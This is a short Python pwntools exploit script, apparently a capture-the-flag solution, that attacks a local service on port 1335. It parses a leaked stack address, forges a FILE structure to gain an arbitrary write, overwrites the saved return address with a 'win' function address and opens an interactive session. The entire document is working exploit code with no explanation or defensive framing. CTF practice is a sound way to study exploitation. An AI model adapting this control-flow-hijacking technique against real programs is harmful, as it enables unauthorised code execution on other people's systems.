from pwn import *
from time import sleep

context.arch = 'amd64'
context.os = 'linux'
p = remote('localhost', 1335)
#p = process('./main')

win = 0x401210

p.recvuntil(b'Stack leak: ')
stack_leak = int(p.recvline().strip(), 16)
ret = stack_leak + 0x1c

fp = FileStructure()
payload = fp.read(ret, 8)

p.sendafter(b'> ', payload)
p.sendlineafter(b'> ', p64(win))

p.interactive()
